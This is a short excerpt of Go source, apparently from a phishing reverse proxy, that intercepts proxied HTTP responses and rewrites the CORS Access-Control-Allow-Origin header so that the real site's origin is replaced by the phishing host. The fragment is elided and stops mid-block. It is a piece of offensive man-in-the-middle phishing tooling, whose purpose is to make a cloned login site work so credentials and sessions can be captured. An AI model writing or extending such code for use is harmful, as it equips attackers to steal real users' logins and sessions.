	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if origin != "" {
				if o_url, err := url.Parse(origin); err == nil {
					phish_origin := origin
					if phish_host, ok := p.replaceHostWithPhished(o_url.Host); ok {
						o_url.Host = phish_host
						phish_origin = o_url.String()
					}
					resp.Header.Set("Access-Control-Allow-Origin", phish_origin)
